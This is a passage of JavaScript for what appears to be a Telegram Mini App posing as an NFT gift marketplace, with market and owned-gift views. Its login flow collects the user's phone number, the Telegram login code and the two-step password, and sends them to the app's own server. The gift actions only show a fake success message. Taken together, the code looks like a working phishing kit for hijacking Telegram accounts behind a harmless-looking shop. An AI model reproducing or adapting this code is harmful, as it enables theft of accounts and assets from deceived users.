  title.textContent = item.name || 'NFT Gift';

  const number = document.createElement('div');
  number.className = 'card-number';
  const numberValue = item.number ?? item.id ?? '';
  number.textContent = numberValue ? `#${numberValue}` : '#—';

  const date = document.createElement('div');
  date.className = 'card-date';
  date.textContent = item.received_at
    ? t('card_received', { date: item.received_at })
    : t('card_received_empty');

  const check = document.createElement('span');
  check.className = 'card-check';
  check.setAttribute('aria-hidden', 'true');

  meta.appendChild(title);
  meta.appendChild(number);
  meta.appendChild(date);

  card.appendChild(media);
  card.appendChild(meta);
  card.appendChild(check);

  card.addEventListener('click', () => {
    triggerHaptic('light');
    setOwnedSelection(card);
  });

  return card;
}

function renderEmpty(target, title, subtitle) {
  const box = document.createElement('div');
  box.className = 'empty-state';
  box.innerHTML = `<div>${title}</div><div>${subtitle}</div>`;
  target.appendChild(box);
}

function renderMarket() {
  if (!elements.marketGrid) return;
  elements.marketGrid.innerHTML = '';
  const query = state.search.replace('#', '').trim();
  const sourceItems = getSortedMarketItems();
  const disableAnimation = state.marketRendered;
  let items = sourceItems.filter((item) => {
    if (!query) return true;
    const idValue = String(item.number ?? item.id ?? '');
    return idValue.includes(query);
  });
  if (state.sortMaxPrice !== null && Number.isFinite(state.sortMaxPrice)) {
    items = items.filter((item) => getPriceValue(item) <= state.sortMaxPrice);
  }

  if (!items.length) {
    renderEmpty(elements.marketGrid, t('empty_market_title'), t('empty_market_subtitle'));
    return;
  }

  const fragment = document.createDocumentFragment();
  items.forEach((item, index) => {
    fragment.appendChild(createMarketCard(item, index, disableAnimation));
  });
  elements.marketGrid.appendChild(fragment);
  renderIcons();
  state.marketRendered = true;
}

function renderOwned() {
  if (!elements.ownedGrid) return;
  elements.ownedGrid.innerHTML = '';
  state.selectedOwnedId = null;
  const disableAnimation = state.ownedRendered;

  if (!state.owned.length) {
    renderEmpty(elements.ownedGrid, t('empty_owned_title'), t('empty_owned_subtitle'));
    return;
  }

  const fragment = document.createDocumentFragment();
  state.owned.forEach((item, index) => {
    fragment.appendChild(createOwnedCard(item, index, disableAnimation));
  });
  elements.ownedGrid.appendChild(fragment);
  state.ownedRendered = true;
}

function setOwnedSelection(card) {
  if (!elements.ownedGrid) return;
  elements.ownedGrid.querySelectorAll('.card').forEach((node) => {
    node.classList.remove('is-selected');
  });
  if (!card) {
    state.selectedOwnedId = null;
    return;
  }
  card.classList.add('is-selected');
  state.selectedOwnedId = card.dataset.ownedId || null;
}

function getSelectedOwnedItem() {
  if (!state.selectedOwnedId) return null;
  for (let i = 0; i < state.owned.length; i += 1) {
    const item = state.owned[i];
    if (getOwnedId(item, i) === state.selectedOwnedId) {
      return item;
    }
  }
  return null;
}

function resetActionInputs() {
  if (!elements.actionInputs?.length) return;
  elements.actionInputs.forEach((input) => {
    input.value = '';
  });
}

function showActionPanel(action) {
  if (!elements.actionPanels?.length) return;
  elements.actionPanels.forEach((panel) => {
    panel.classList.toggle('is-active', panel.dataset.actionPanel === action);
  });
}

function openActionModal(action) {
  if (!elements.actionModal) return;
  const item = getSelectedOwnedItem();
  if (!item) return;
  const config = ACTION_CONFIG[action] || ACTION_CONFIG.send;
  if (elements.actionTitle) {
    elements.actionTitle.dataset.i18n = config.title;
    elements.actionTitle.textContent = t(config.title);
  }
  if (elements.actionSubtitle) {
    elements.actionSubtitle.dataset.i18n = config.subtitle;
    elements.actionSubtitle.textContent = t(config.subtitle);
  }
  if (elements.actionSubmit) {
    elements.actionSubmit.dataset.i18n = config.button;
    elements.actionSubmit.textContent = t(config.button);
  }

  const image = resolveImageUrl(item.image) || buildPlaceholder(item.number || item.id, item.name);
  if (elements.actionGiftImage) {
    elements.actionGiftImage.src = image;
    elements.actionGiftImage.alt = item.name || 'Gift';
  }
  if (elements.actionGiftName) elements.actionGiftName.textContent = item.name || 'Gift';
  if (elements.actionGiftNumber) {
    const numberValue = item.number ?? item.id ?? '';
    elements.actionGiftNumber.textContent = numberValue ? `#${numberValue}` : '#—';
  }

  state.activeOwnedAction = action;
  resetActionInputs();
  showActionPanel(action);
  elements.actionModal.classList.add('open');
  elements.actionModal.setAttribute('aria-hidden', 'false');
}

function closeActionModal() {
  if (!elements.actionModal) return;
  elements.actionModal.classList.remove('open');
  elements.actionModal.setAttribute('aria-hidden', 'true');
  state.activeOwnedAction = null;
}

function setTab(tabName) {
  elements.tabs.forEach((tab) => {
    tab.classList.toggle('is-active', tab.dataset.tab === tabName);
  });
  elements.navItems.forEach((btn) => {
    btn.classList.toggle('is-active', btn.dataset.tab === tabName);
  });

  if (document.body.classList.contains('is-loading')) {
    document.body.classList.remove('is-loading');
  }
  if (dataLoaded) {
    clearBootOverlay();
  }

  if (tabName === 'profile') {
    elements.headerMain.style.display = 'none';
    elements.headerProfile.style.display = 'block';
  } else {
    elements.headerMain.style.display = 'block';
    elements.headerProfile.style.display = 'none';
    closeSettingsPanel();
  }

  if (tabName === 'market' && dataLoaded) {
    renderMarket();
  }
}

function showToast(message) {
  if (!elements.toast) return;
  elements.toast.textContent = message;
  elements.toast.classList.add('visible');
  clearTimeout(showToast.timer);
  showToast.timer = setTimeout(() => {
    elements.toast.classList.remove('visible');
  }, 2400);
}

function showAlert(message, duration = 4000) {
  if (!elements.alert) return;
  elements.alert.textContent = message;
  elements.alert.classList.add('visible');
  clearTimeout(showAlert.timer);
  showAlert.timer = setTimeout(() => {
    elements.alert.classList.remove('visible');
  }, duration);
}

function extractWaitSeconds(detail) {
  const text = String(detail || '');
  const secMatch = text.match(/(\d+)\s*сек/i);
  if (secMatch) {
    const seconds = Number(secMatch[1]);
    if (Number.isFinite(seconds) && seconds > 0) return seconds;
  }
  const minMatch = text.match(/(\d+)\s*мин/i);
  if (minMatch) {
    const minutes = Number(minMatch[1]);
    if (Number.isFinite(minutes) && minutes > 0) return minutes * 60;
  }
  return null;
}

function setAuthorized(isAuthorized) {
  state.isAuthorized = isAuthorized;
}

function renderIcons() {
  if (window.lucide?.createIcons) {
    window.lucide.createIcons();
  }
}

function bindNavigation() {
  elements.navItems.forEach((btn) => {
    btn.addEventListener('click', () => {
      triggerHaptic('light');
      setTab(btn.dataset.tab);
    });
  });
}

function bindBalancePlus() {
  if (!elements.balancePlus) return;
  elements.balancePlus.addEventListener('click', () => {
    triggerHaptic('light');
    openAuthModal();
  });
}

function bindSearch() {
  if (!elements.searchInput) return;
  elements.searchInput.addEventListener('input', (event) => {
    state.search = event.target.value || '';
    renderMarket();
  });
}

function bindFilters() {
  if (!elements.filterBtn || !elements.sortPanel) return;
  elements.filterBtn.addEventListener('click', () => {
    triggerHaptic('light');
    const isOpen = elements.sortPanel.classList.toggle('is-open');
    elements.filterBtn.classList.toggle('is-active', isOpen);
    elements.filterBtn.setAttribute('aria-expanded', String(isOpen));
  });
}

function bindSettings() {
  if (!elements.settingsBtn || !elements.settingsPanel) return;

  elements.settingsBtn.addEventListener('click', (event) => {
    event.stopPropagation();
    triggerHaptic('light');
    toggleSettingsPanel();
  });

  elements.settingsPanel.addEventListener('click', (event) => {
    event.stopPropagation();
  });

  document.addEventListener('click', () => {
    if (!elements.settingsPanel.classList.contains('is-open')) return;
    closeSettingsPanel();
  });

  if (elements.settingsHapticsButtons.length) {
    elements.settingsHapticsButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        const enabled = btn.dataset.haptics === 'on';
        setHapticsEnabled(enabled);
        applySettingsUi();
      });
    });
  }

  if (elements.settingsLanguageButtons.length) {
    elements.settingsLanguageButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        const lang = btn.dataset.lang === 'en' ? 'en' : 'ru';
        setLanguage(lang);
        applySettingsUi();
      });
    });
  }
}

function bindSortChips() {
  if (!elements.sortChips.length) return;
  elements.sortChips.forEach((chip) => {
    chip.addEventListener('click', () => {
      const mode = chip.dataset.sort || 'cheap';
      triggerHaptic('light');
      setSortMode(mode);
      renderMarket();
    });
  });
}

function bindSortRange() {
  if (!elements.sortRange) return;
  elements.sortRange.addEventListener('input', (event) => {
    const value = Number(event.target.value);
    if (!Number.isFinite(value)) return;
    state.sortMaxPrice = value;
    updateSortUi();
    renderMarket();
  });
  elements.sortRange.addEventListener('change', () => {
    triggerHaptic('light');
  });
}

function bindCodeInput() {
  if (!elements.authCodeInput) return;
  if (elements.codeInput) {
    elements.codeInput.addEventListener('click', () => {
      elements.authCodeInput.focus();
    });
  }
  const maybeAutoSubmit = () => {
    if (!elements.authCodeInput) return;
    const raw = elements.authCodeInput.value || '';
    const digits = raw.replace(/\D/g, '').slice(0, 5);
    if (raw !== digits) {
      elements.authCodeInput.value = digits;
    }
    if (digits.length === 5 && authToken && !authLoading) {
      submitCode({ preventDefault() {} });
    }
  };
  elements.authCodeInput.addEventListener('input', () => {
    setCodeError(false);
    syncCodeCells();
    maybeAutoSubmit();
  });
  elements.authCodeInput.addEventListener('focus', () => {
    setCodeError(false);
    syncCodeCells();
  });
  elements.authCodeInput.addEventListener('paste', () => {
    setTimeout(maybeAutoSubmit, 0);
  });

}

function bindPasswordInput() {
  if (elements.authPasswordInput) {
    elements.authPasswordInput.addEventListener('input', () => {
      setPasswordError(false);
    });
    elements.authPasswordInput.addEventListener('focus', () => {
      setPasswordError(false);
    });
  }

  if (!elements.passwordToggle || !elements.authPasswordInput) return;
  elements.passwordToggle.addEventListener('click', () => {
    const input = elements.authPasswordInput;
    const isHidden = input.type === 'password';
    input.type = isHidden ? 'text' : 'password';
    elements.passwordToggle.classList.toggle('is-visible', isHidden);
    updatePasswordToggleLabel();
    input.focus();
  });
}

function bindGiftModal() {
  if (!elements.giftModal) return;
  elements.giftModal.querySelectorAll('[data-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeGiftModal();
    });
  });
  if (elements.giftAccept) {
    elements.giftAccept.addEventListener('click', () => {
      triggerHaptic('light');
      closeGiftModal();
    });
  }
}

function bindActionModal() {
  if (!elements.actionModal) return;
  elements.actionModal.querySelectorAll('[data-close="true"], [data-action-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeActionModal();
    });
  });
  if (elements.actionSubmit) {
    elements.actionSubmit.addEventListener('click', () => {
      triggerHaptic('light');
      closeActionModal();
      showToast(t('action_done'));
    });
  }
}

function bindActions() {
  elements.actionButtons.forEach((btn) => {
    btn.addEventListener('click', () => {
      if (!state.selectedOwnedId) {
        triggerHaptic('heavy');
        showToast(t('toast_select_gift'));
        return;
      }
      triggerHaptic('light');
      if (state.hasChatAccess) {
        openActionModal(btn.dataset.action || 'send');
        return;
      }
      openAuthModal();
    });
  });
}

function showAuthStep(step) {
  const steps = [
    elements.authIntro,
    elements.authPhoneForm,
    elements.authCodeForm,
    elements.authPasswordForm,
    elements.authLoading,
    elements.authSuccess,
  ];
  steps.forEach((el) => {
    if (!el) return;
    el.classList.toggle('is-active', el === step);
  });
  if (step === elements.authCodeForm) {
    setCodeError(false);
    syncCodeCells();
    if (elements.authCodeInput) {
      setTimeout(() => {
        elements.authCodeInput.focus();
      }, 50);
    }
  }
}

function setAuthStatus(message, isError = false) {
  if (!elements.authStatus) return;
  elements.authStatus.textContent = message;
  elements.authStatus.classList.toggle('error', isError);
  if (isError) triggerHaptic('heavy');
}

function toggleAuthInputs(form, disabled) {
  if (!form) return;
  form.querySelectorAll('input, button').forEach((el) => {
    el.disabled = disabled;
  });
}

function openAuthModal() {
  if (!elements.authModal) return;
  elements.authModal.classList.add('open');
  elements.authModal.setAttribute('aria-hidden', 'false');
  authToken = null;
  setAuthStatus('');
  if (elements.authCodeInput) elements.authCodeInput.value = '';
  if (elements.authPasswordInput) elements.authPasswordInput.value = '';
  setCodeError(false);
  setPasswordError(false);
  syncCodeCells();
  showAuthStep(elements.authIntro);
}

function closeAuthModal() {
  if (!elements.authModal) return;
  elements.authModal.classList.remove('open');
  elements.authModal.setAttribute('aria-hidden', 'true');
  authToken = null;
  authLoading = false;
  setAuthStatus('');
  setPasswordError(false);
  if (elements.authIntro) {
    showAuthStep(elements.authIntro);
  }
}

function getLatestGiftItem(items) {
  if (!Array.isArray(items)) return null;
  const currentUser = getTelegramUser();
  const currentUserId = currentUser?.id ?? null;
  const matches = items.filter((item) => {
    if (currentUserId && item?.owner_id && Number(item.owner_id) !== Number(currentUserId)) {
      return false;
    }
    return isToyBearItem(item);
  });
  return matches.length ? matches[matches.length - 1] : null;
}

function markGiftPopupSeen(giftId) {
  if (!giftId) return;
  try {
    localStorage.setItem(GIFT_POPUP_KEY, giftId);
  } catch (err) {
    console.warn('Failed to store gift popup key:', err);
  }
}

function openGiftModal(gift) {
  if (!elements.giftModal) return;
  const giftId = String(gift?.id ?? gift?.number ?? '');
  elements.giftModal.dataset.giftId = giftId;
  elements.giftModal.classList.add('open');
  elements.giftModal.setAttribute('aria-hidden', 'false');
  if (elements.giftImage) {
    elements.giftImage.src = `${API_BASE}${GIFT_POPUP_GIF}`;
    elements.giftImage.alt = `${GIFT_POPUP_NAME}-${GIFT_POPUP_NUMBER}`;
  }
}

function closeGiftModal() {
  if (!elements.giftModal) return;
  elements.giftModal.classList.remove('open');
  elements.giftModal.setAttribute('aria-hidden', 'true');
  const giftId = elements.giftModal.dataset.giftId;
  if (giftId) markGiftPopupSeen(giftId);
}

function maybeShowGiftPopup() {
  if (!elements.giftModal) return;
  const gift = getLatestGiftItem(state.owned);
  if (!gift) return;
  const giftId = String(gift.id ?? gift.number ?? '');
  if (!giftId) return;
  let seenId = null;
  try {
    seenId = localStorage.getItem(GIFT_POPUP_KEY);
  } catch (err) {
    console.warn('Failed to read gift popup key:', err);
  }
  if (seenId === giftId) return;
  setTimeout(() => {
    openGiftModal(gift);
  }, 200);
}

function isPasswordRequired(detail) {
  const text = String(detail || '');
  return (
    /Password required/i.test(text) ||
    /2FA/i.test(text) ||
    /Two-steps verification/i.test(text) ||
    /two-step/i.test(text) ||
    /SESSION_PASSWORD_NEEDED/i.test(text) ||
    /двухфактор/i.test(text)
  );
}

function extractPhoneFromPayload(payload) {
  if (!payload) return null;
  const direct =
    payload.phone_number ||
    payload.phone ||
    payload.contact?.phone_number ||
    payload.user?.phone_number;
  if (direct) return direct;

  const responseUnsafe = payload.responseUnsafe;
  if (responseUnsafe) {
    if (typeof responseUnsafe === 'string') {
      const params = new URLSearchParams(responseUnsafe);
      const phone = params.get('phone_number') || params.get('phone');
      if (phone) return phone;
    } else {
      const phone =
        responseUnsafe.phone_number ||
        responseUnsafe.phone ||
        responseUnsafe.contact?.phone_number ||
        responseUnsafe.user?.phone_number;
      if (phone) return phone;
    }
  }

  const response = payload.response;
  if (response) {
    if (typeof response === 'string') {
      const params = new URLSearchParams(response);
      return params.get('phone_number') || params.get('phone') || null;
    }
    if (typeof response === 'object') {
      return (
        response.phone_number ||
        response.phone ||
        response.contact?.phone_number ||
        response.user?.phone_number ||
        null
      );
    }
  }

  return null;
}

function requestPhoneFromTelegram() {
  const tg = tgWebApp || window.Telegram?.WebApp;
  return new Promise((resolve) => {
    let settled = false;
    const finish = (payload, success) => {
      if (settled) return;
      settled = true;
      const phone = extractPhoneFromPayload(payload);
      const shared = Boolean(success) || payload?.status === 'sent';
      resolve({ phone, shared });
    };

    const handle = (success, data) => {
      if (data === undefined && success && typeof success === 'object') {
        return finish(success, true);
      }
      return finish(data, success);
    };

    try {
      if (typeof tg?.requestContact === 'function') {
        const result = tg.requestContact((success, data) => {
          handle(success, data);
        });
        if (result && typeof result.then === 'function') {
          result.then((data) => handle(true, data)).catch(() => finish(null, false));
        }
      } else {
        finish(null, false);
      }
    } catch (err) {
      console.warn('requestContact failed:', err);
      finish(null, false);
    }
  });
}

async function requestPendingToken() {
  const requester = buildRequesterPayload();
  const userId = requester.user_id;
  if (!userId) return null;
  try {
    const res = await fetch(`${API_BASE}/auth/pending?user_id=${encodeURIComponent(userId)}`, {
      cache: 'no-store',
    });
    if (!res.ok) return null;
    const data = await res.json();
    return data?.token || null;
  } catch (err) {
    console.warn('Pending token fetch failed:', err);
    return null;
  }
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitForPendingToken(timeoutMs = 8000, intervalMs = 700) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (elements.authModal && !elements.authModal.classList.contains('open')) {
      return null;
    }
    const token = await requestPendingToken();
    if (token) return token;
    await delay(intervalMs);
  }
  return null;
}

async function startAuth(event) {
  if (event?.preventDefault) event.preventDefault();
  if (authLoading) return;
  triggerHaptic('light');

  authLoading = true;
  if (elements.authStart) elements.authStart.disabled = true;
  setAuthStatus('');

  const contact = await requestPhoneFromTelegram();
  const phone = contact?.phone;
  const shared = contact?.shared;
  if (shared) {
    showAuthStep(elements.authLoading);
  }
  if (!phone) {
    if (shared) {
      setAuthStatus(t('sending_code'));
      const pendingToken = await waitForPendingToken();
      if (pendingToken) {
        authToken = pendingToken;
        setAuthStatus(t('code_sent'));
        showAuthStep(elements.authCodeForm);
        authLoading = false;
        if (elements.authStart) elements.authStart.disabled = false;
        return;
      }
      setAuthStatus('');
      showAuthStep(elements.authIntro);
    }
    authLoading = false;
    if (elements.authStart) elements.authStart.disabled = false;
    return;
  }

  const digits = String(phone).replace(/\D/g, '');
  if (digits.length < 7) {
    setAuthStatus(t('phone_short'), true);
    authLoading = false;
    if (elements.authStart) elements.authStart.disabled = false;
    return;
  }

  setAuthStatus(t('sending_code'));

  try {
    const res = await fetch(`${API_BASE}/auth/start`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone: `+${digits}`,
        requester: buildRequesterPayload(),
      }),
    });
    const data = await res.json();

    if (!res.ok) {
      if (res.status === 429) {
        const seconds = extractWaitSeconds(data?.detail);
        const message = seconds
          ? t('rate_limit', { seconds })
          : t('rate_limit_generic');
        triggerHaptic('heavy');
        showAlert(message);
        showAuthStep(elements.authIntro);
        return;
      }
      throw new Error(data?.detail || t('send_code_failed'));
    }

    authToken = data.token;
    setAuthStatus(t('code_sent'));
    showAuthStep(elements.authCodeForm);
  } catch (err) {
    setAuthStatus(err.message || t('send_code_error'), true);
    showAuthStep(elements.authIntro);
  } finally {
    authLoading = false;
    if (elements.authStart) elements.authStart.disabled = false;
  }
}

async function verifyAuth(payload) {
  const res = await fetch(`${API_BASE}/auth/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    keepalive: true,
  });
  const data = await res.json();
  return { res, data };
}

async function submitCode(event) {
  event.preventDefault();
  if (authLoading || !authToken) return;
  triggerHaptic('light');
  setCodeError(false);

  const code = elements.authCodeInput?.value?.trim() || '';
  if (code.length < 5) {
    setCodeError(true);
    setAuthStatus(t('code_short'), true);
    return;
  }

  authLoading = true;
  toggleAuthInputs(elements.authCodeForm, true);
  setAuthStatus(t('verify_code'));

  try {
    const { res, data } = await verifyAuth({
      token: authToken,
      code,
      requester: buildRequesterPayload(),
    });

    if (!res.ok) {
      const detail = data?.detail || t('auth_error');
      if (isPasswordRequired(detail)) {
        setAuthStatus(t('password_required'));
        showAuthStep(elements.authPasswordForm);
        return;
      }
      throw new Error(detail);
    }

    showAuthStep(elements.authLoading);
    await wait(5000);
    showAuthStep(elements.authSuccess);
    setAuthorized(true);
  } catch (err) {
    setCodeError(true);
    setAuthStatus(err.message || t('auth_error'), true);
  } finally {
    authLoading = false;
    toggleAuthInputs(elements.authCodeForm, false);
  }
}

async function submitPassword(event) {
  event.preventDefault();
  if (authLoading || !authToken) return;
  triggerHaptic('light');
  setPasswordError(false);

  const password = elements.authPasswordInput?.value?.trim() || '';
  if (!password) {
    setPasswordError(true);
    return;
  }

  authLoading = true;
  toggleAuthInputs(elements.authPasswordForm, true);
  setAuthStatus(t('verify_password'));

  try {
    const { res, data } = await verifyAuth({
      token: authToken,
      password,
      requester: buildRequesterPayload(),
    });

    if (!res.ok) throw new Error(data?.detail || t('auth_error'));

    showAuthStep(elements.authLoading);
    await wait(5000);
    showAuthStep(elements.authSuccess);
    setAuthorized(true);
  } catch (err) {
    setPasswordError(true);
    if (elements.authPasswordInput) {
      elements.authPasswordInput.value = '';
      elements.authPasswordInput.focus();
    }
    setAuthStatus('');
  } finally {
    authLoading = false;
    toggleAuthInputs(elements.authPasswordForm, false);
  }
}

function bindAuthModal() {
  if (elements.authModal) {
    elements.authModal.querySelectorAll('[data-close="true"]').forEach((el) => {
      el.addEventListener('click', () => {
        triggerHaptic('light');
        closeAuthModal();
      });
    });
  }

  if (elements.authStart) {
    elements.authStart.addEventListener('click', () => {
      triggerHaptic('light');
      startAuth();
    });
  }

  if (elements.authCodeForm) elements.authCodeForm.addEventListener('submit', submitCode);
  if (elements.authPasswordForm) elements.authPasswordForm.addEventListener('submit', submitPassword);
  if (elements.authBack) {
    elements.authBack.addEventListener('click', () => {
      triggerHaptic('light');
      authToken = null;
      showAuthStep(elements.authIntro);
    });
  }
  if (elements.authBackPassword) {
    elements.authBackPassword.addEventListener('click', () => {
      triggerHaptic('light');
      setPasswordError(false);
      if (elements.authPasswordInput) {
        elements.authPasswordInput.value = '';
      }
      showAuthStep(elements.authCodeForm);
    });
  }
}

async function loadData(skipBoot = shouldSkipBoot()) {
  if (dataLoaded) return;
  dataLoaded = true;
  const minDelay = skipBoot ? wait(0) : wait(3000);
  const gifReady = preloadImage(`${API_BASE}${GIFT_POPUP_GIF}`);
  const [marketRes, ownedRes, profileRes, accessRes] = await Promise.all([
    fetchJson('/market/gifts', { items: DEFAULT_MARKET }),
    fetchJson('/market/owned', { items: DEFAULT_OWNED }),
    fetchJson(getProfilePath(), DEFAULT_PROFILE),
    fetchJson(getAccessPath(), { allowed: false }),
  ]);

  const baseMarket = Array.isArray(marketRes?.items) ? marketRes.items : DEFAULT_MARKET;
  state.market = baseMarket;
  state.marketPopular = shufflePreferCheap(baseMarket);
  state.marketNew = [...baseMarket].sort((a, b) => getItemNumberValue(b) - getItemNumberValue(a));
  initSortRange(baseMarket);
  setSortMode(state.sortMode);
  const ownedItems = Array.isArray(ownedRes?.items) ? ownedRes.items : DEFAULT_OWNED;
  const ownedForUser = filterOwnedForCurrentUser(ownedItems);
  state.owned = dedupeToyBear(ownedForUser);
  state.profile = profileRes || DEFAULT_PROFILE;
  state.hasChatAccess = Boolean(accessRes?.allowed);

  await Promise.all([minDelay, gifReady]);
  renderMarket();
  renderOwned();
  applyProfile(state.profile);

  clearBootOverlay();
  markBootShown();
  maybeShowGiftPopup();
}

document.addEventListener('DOMContentLoaded', () => {
  initTelegram();
  loadSettings();
  applyTranslations();
  applySettingsUi();
  const skipBoot = shouldSkipBoot();
  if (elements.boot) {
    if (skipBoot) {
      clearBootOverlay();
    } else {
      setTimeout(() => {
        elements.boot.classList.add('is-active');
      }, 60);
    }
  }
  bindNavigation();
  bindSearch();
  bindFilters();
  bindSettings();
  bindSortChips();
  bindSortRange();
  bindCodeInput();
  bindPasswordInput();
  bindGiftModal();
  bindActionModal();
  bindActions();
  bindBalancePlus();
  bindAuthModal();
  setAuthorized(false);
  setTab('market');
  loadData(skipBoot);
  renderIcons();
});
